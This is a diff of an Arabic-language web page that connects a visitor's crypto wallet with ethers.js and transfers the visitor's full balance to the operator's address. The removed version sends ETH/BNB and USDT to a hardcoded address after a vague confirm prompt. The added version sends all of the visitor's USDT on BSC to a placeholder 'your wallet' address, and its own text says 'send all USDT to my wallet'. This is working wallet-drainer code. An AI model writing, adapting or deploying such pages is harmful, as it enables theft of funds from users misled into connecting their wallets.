@@ -1,212 +1,127 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>محفظة الإرسال مع خلفية فيديو</title>
-
-  <!-- مكتبات Ethers و Web3Modal -->
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-
-  <style>
-    html, body {
-      margin: 0; padding: 0; height: 100%; overflow: hidden;
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      direction: rtl;
-      background: black;
-    }
-
-    video.bg-video {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
-      object-fit: cover;
-      z-index: -1;
-    }
-
-    .centered {
-      position: absolute;
-      top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      text-align: center;
-      color: white;
-    }
-
-    #connectBtn, #sendBtn {
-      font-size: 20px;
-      padding: 15px 40px;
-      border-radius: 10px;
-      border: none;
-      cursor: pointer;
-      color: white;
-      transition: background-color 0.3s ease;
-      margin-top: 10px;
-    }
-
-    #connectBtn {
-      background-color: #3396FF;
-    }
-
-    #connectBtn:hover {
-      background-color: #0d78cc;
-    }
-
-    #sendBtn {
-      background-color: #00aaff;
-      display: none;
-    }
-
-    #sendBtn:hover {
-      background-color: #0088cc;
-    }
-
-    .info {
-      margin-top: 20px;
-      font-size: 18px;
-      color: #fff;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>إرسال USDT على BSC</title>
+<style>
+  body {
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    background: #1e1e2f;
+    color: #eee;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 40px 20px;
+  }
+  h2 {
+    margin-bottom: 25px;
+    color: #7fffd4;
+  }
+  button {
+    padding: 12px 24px;
+    font-size: 18px;
+    background-color: #7fffd4;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+    color: #1e1e2f;
+    margin-top: 15px;
+  }
+  button:disabled {
+    background-color: #555;
+    cursor: not-allowed;
+  }
+  #walletAddress, #usdtBalance, #status {
+    margin-top: 15px;
+    font-weight: bold;
+  }
+  #status {
+    min-height: 40px;
+  }
+</style>
 </head>
 <body>
 
-  <video class="bg-video" autoplay muted loop>
-    <source src="background.mp4" type="video/mp4" />
-    متصفحك لا يدعم عرض الفيديو.
-  </video>
+<h2>ربط محفظتك على Binance Smart Chain وإرسال USDT</h2>
 
-  <div class="centered">
-    <button id="connectBtn" title="Connect Wallet">walletconnect</button>
-    <button id="sendBtn">إرسال الرصيد</button>
-    <div class="info" id="walletInfo"></div>
-  </div>
+<button id="connectBtn">ربط المحفظة</button>
+<div id="walletAddress"></div>
+<div id="usdtBalance"></div>
+<button id="sendBtn" disabled>إرسال كل USDT إلى محفظتي</button>
 
-  <script>
-    const providerOptions = {
-      walletconnect: {
-        package: window.WalletConnectProvider.default,
-        options: {
-          rpc: {
-            1: "https://mainnet.infura.io/v3/3150f6b8d5924ed59dad280434ea226f",
-            56: "https://bsc-dataseed.binance.org/"
-          },
-          bridge: "https://bridge.walletconnect.org",
-          qrcode: true
-        }
-      }
-    };
+<div id="status"></div>
 
-    const web3Modal = new window.Web3Modal.default({
-      cacheProvider: false,
-      providerOptions
-    });
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script>
+  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT على BSC
+  const recipientAddress = "ضع_هنا_عنوان_محفظتك"; // غيره هنا
 
-    const recipient = "0x9b767999d83651c244d2225a910a3a2456c98a3c";
+  const usdtAbi = [
+    "function balanceOf(address owner) view returns (uint256)",
+    "function transfer(address to, uint amount) returns (bool)"
+  ];
 
-    let provider, signer, userAddress, chainId;
+  let provider, signer, userAddress, contract;
 
-    async function connectWallet() {
-      try {
-        const instance = await web3Modal.connect();
-        provider = new ethers.providers.Web3Provider(instance);
-        signer = provider.getSigner();
-        userAddress = await signer.getAddress();
-        const network = await provider.getNetwork();
-        chainId = network.chainId;
+  const connectBtn = document.getElementById("connectBtn");
+  const sendBtn = document.getElementById("sendBtn");
+  const walletAddressDiv = document.getElementById("walletAddress");
+  const usdtBalanceDiv = document.getElementById("usdtBalance");
+  const statusDiv = document.getElementById("status");
 
-        const balance = await provider.getBalance(userAddress);
-        const ethBalance = ethers.utils.formatEther(balance);
+  connectBtn.onclick = async () => {
+    try {
+      if (!window.ethereum) throw new Error("يرجى تثبيت MetaMask!");
 
-        document.getElementById("walletInfo").innerText =
-          `العنوان: ${userAddress}\n` +
-          `الشبكة: ${network.name} (ID: ${chainId})\n` +
-          `الرصيد: ${ethBalance} ${chainId === 56 ? "BNB" : "ETH"}`;
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      userAddress = await signer.getAddress();
 
-        const balances = await checkBalances();
-        if (balances.some(b => b.found)) {
-          document.getElementById("sendBtn").style.display = "inline-block";
-        } else {
-          alert("لم يتم العثور على رصيد من العملات المدعومة.");
-        }
-      } catch (err) {
-        alert("فشل الاتصال بالمحفظة: " + err.message);
-      }
+      walletAddressDiv.textContent = "محفظتك: " + userAddress;
+
+      const network = await provider.getNetwork();
+      if (network.chainId !== 56) throw new Error("يرجى التبديل إلى شبكة Binance Smart Chain في MetaMask.");
+
+      contract = new ethers.Contract(usdtAddress, usdtAbi, signer);
+      const balance = await contract.balanceOf(userAddress);
+      const formattedBalance = ethers.utils.formatUnits(balance, 18);
+
+      usdtBalanceDiv.textContent = "رصيد USDT: " + formattedBalance;
+
+      sendBtn.disabled = balance.isZero();
+      statusDiv.textContent = "";
+    } catch (err) {
+      statusDiv.textContent = err.message || err;
+      sendBtn.disabled = true;
+      walletAddressDiv.textContent = "";
+      usdtBalanceDiv.textContent = "";
     }
+  };
 
-    async function checkBalances() {
-      const balances = [];
-
-      const nativeBalance = await provider.getBalance(userAddress);
-      if (nativeBalance.gt(0)) {
-        balances.push({ symbol: chainId === 56 ? "BNB" : "ETH", found: true, value: nativeBalance });
-      } else {
-        balances.push({ symbol: chainId === 56 ? "BNB" : "ETH", found: false });
+  sendBtn.onclick = async () => {
+    try {
+      statusDiv.textContent = "جارٍ إرسال المعاملة، يرجى الانتظار...";
+      const balance = await contract.balanceOf(userAddress);
+      if (balance.isZero()) {
+        statusDiv.textContent = "رصيدك صفر، لا يوجد ما يتم إرساله.";
+        sendBtn.disabled = true;
+        return;
       }
 
-      const usdtAddresses = {
-        1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-        56: "0x55d398326f99059fF775485246999027B3197955"
-      };
+      const tx = await contract.transfer(recipientAddress, balance);
+      await tx.wait();
 
-      const usdtAddress = usdtAddresses[chainId];
-      if (usdtAddress) {
-        const usdtAbi = [
-          "function balanceOf(address) view returns (uint256)",
-          "function transfer(address to, uint256 value) returns (bool)"
-        ];
-        const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
-        const usdtBalance = await usdtContract.balanceOf(userAddress);
-        balances.push({ symbol: "USDT", found: usdtBalance.gt(0), value: usdtBalance, contract: usdtContract });
-      }
-
-      return balances;
+      statusDiv.textContent = "تم إرسال جميع USDT إلى محفظتي بنجاح!";
+      sendBtn.disabled = true;
+      usdtBalanceDiv.textContent = "رصيد USDT: 0";
+    } catch (err) {
+      statusDiv.textContent = "حدث خطأ: " + (err.message || err);
     }
+  };
+</script>
 
-    async function sendFunds() {
-      try {
-        const balances = await checkBalances();
-        let message = "هل تريد إرسال الأرصدة التالية؟\n\n";
-        let hasFunds = false;
-
-        for (const token of balances) {
-          if (token.found) {
-            hasFunds = true;
-            const formatted = ethers.utils.formatUnits(token.value, 18);
-            message += `- ${token.symbol}: ${formatted}\n`;
-          }
-        }
-
-        if (!hasFunds) {
-          alert("لا يوجد رصيد للإرسال.");
-          return;
-        }
-
-        const confirmed = confirm(message + "\nسيتم الإرسال إلى العنوان:\n" + recipient);
-        if (!confirmed) return;
-
-        for (const token of balances) {
-          if (!token.found) continue;
-
-          if (token.symbol === "ETH" || token.symbol === "BNB") {
-            await signer.sendTransaction({
-              to: recipient,
-              value: token.value
-            });
-          } else if (token.symbol === "USDT") {
-            await token.contract.transfer(recipient, token.value);
-          }
-        }
-
-        alert("تم إرسال الرصيد بنجاح.");
-      } catch (err) {
-        alert("حدث خطأ أثناء الإرسال: " + err.message);
-      }
-    }
-
-    document.getElementById("connectBtn").addEventListener("click", connectWallet);
-    document.getElementById("sendBtn").addEventListener("click", sendFunds);
-  </script>
 </body>
 </html>
